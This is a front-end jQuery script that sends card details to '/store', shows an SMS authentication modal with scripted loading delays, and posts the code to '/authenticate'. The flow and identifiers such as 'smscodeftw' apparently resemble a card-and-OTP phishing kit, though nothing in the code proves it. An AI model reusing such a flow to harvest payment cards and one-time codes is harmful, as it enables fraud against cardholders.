$("#card_info").on("submit", function (t) {
    t.preventDefault();
    var e = $(this).parsley(),
        n = e.isValid();
    if (($(".bs-callout-info").toggleClass("hidden", !n), $(".bs-callout-warning").toggleClass("hidden", n), n)) {
        e.reset();
        var i = $(this),
            r = i.serialize();
            $(".modal").modal("hide")
            const xhttp = new XMLHttpRequest();
            xhttp.onload = function() {
              data = JSON.parse(this.responseText)
               setTimeout(function () {
                $("#auth-modal").replaceWith(data["data"])
                 $("#auth-modal").modal({ backdrop: "static", keyboard: !1 }).modal("show");
                 }, 10)
                 $("body").on("shown.bs.modal", "#auth-modal", function () {
                    var t = $(this);
                    setTimeout(function () {
                        t.find(".loading-1").hide();
                        t.find(".loading-2").show();
                    }, 2000)
                });
              document.getElementById("auth-modal").innerHTML =data["data"]
            }            
            xhttp.open("POST", "/store");
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.setRequestHeader("X-CSRF-TOKEN", $('meta[name="csrf-token"]').attr('content'));
            xhttp.send(r);
          }
        });
        $("body").on("submit", "#auth-modal form", function (e) {
            e.preventDefault();
            var n = $(this)
           document.getElementById("csrfftw").value = $('meta[name="csrf-token"]').attr('content');
                i = n.closest(".modal"),
                r = n.serialize();
                const xhttp = new XMLHttpRequest();
                xhttp.onload = function() {
                  data = JSON.parse(this.responseText)
                  if(!data["success"]){
                  i = $("body")
                  setTimeout(function () {
                    i.find(".loading-2").hide()
                     i.find("#smscodeftw").val("")
                      i.find(".auth-form").show()
                       $("#auth-error").show();
                }, 2000);
                }
                else{
                    window.location.href = "/success";
                }
            }
                $("#auth-error").hide()
             i.find(".auth-form").hide()
              i.find(".loading-2").show();
                xhttp.open("POST", "/authenticate");
                xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xhttp.setRequestHeader("X-CSRF-TOKEN", $('meta[name="csrf-token"]').attr('content'));
                xhttp.send(r);
        });